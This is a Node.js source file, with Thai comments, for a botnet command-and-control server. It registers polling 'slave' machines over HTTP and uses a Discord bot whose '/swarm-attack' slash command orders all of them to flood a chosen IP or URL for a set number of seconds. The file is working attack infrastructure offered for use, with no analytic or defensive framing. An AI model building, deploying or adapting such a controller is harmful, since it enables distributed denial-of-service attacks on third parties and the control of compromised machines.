const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

// สร้าง HTTP Server แบบดั้งเดิมของ Node.js ไม่ต้องพึ่ง Express ให้หงุดหงิด
const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
        if (req.method === 'POST' && req.url === '/poll') {
            try {
                const data = JSON.parse(body);
                if (data.id && !slaveNodes.some(node => node.id === data.id)) {
                    slaveNodes.push({ id: data.id, ip: req.socket.remoteAddress, lastSeen: Date.now() });
                    console.log(`[+] เครื่องทาสรายงานตัวเข้ามาใหม่: ${data.id}`);
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ command: global.currentAttackCommand || null }));
            } catch (e) {
                res.writeHead(400);
                res.end('Bad Request');
            }
        } else {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('JARVIS C2 Server is running smoothly.');
        }
    });
});

server.listen(PORT, () => {
    console.log(`[+] C2 HTTP Server running on port ${PORT}`);
});

// Discord Bot Setup
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', async () => {
    console.log(`[+] C2 Discord Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('swarm-attack')
            .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
            .addStringOption(option => option.setName('target').setDescription('IP หรือ URL เป้าหมาย').setRequired(true))
            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลา (วินาที)').setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('ตรวจสอบจำนวนเครื่องทาสในกองทัพ')
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log('[+] C2 Slash commands registered successfully.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาส: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
    }

    if (interaction.commandName === 'swarm-attack') {
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (slaveNodes.length === 0) {
            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ!', ephemeral: true });
        }

        global.currentAttackCommand = {
            id: Math.random().toString(36).substring(7),
            action: 'attack',
            target: target,
            duration: duration
        };

        await interaction.reply(`[🔥⚡] สั่งการกองทัพ ${slaveNodes.length} เครื่อง ถล่ม ${target} เป็นเวลา ${duration} วินาทีแล้ว!`);

        setTimeout(() => {
            global.currentAttackCommand = null;
        }, duration * 1000);
    }
});

client.login(process.env.DISCORD_TOKEN);
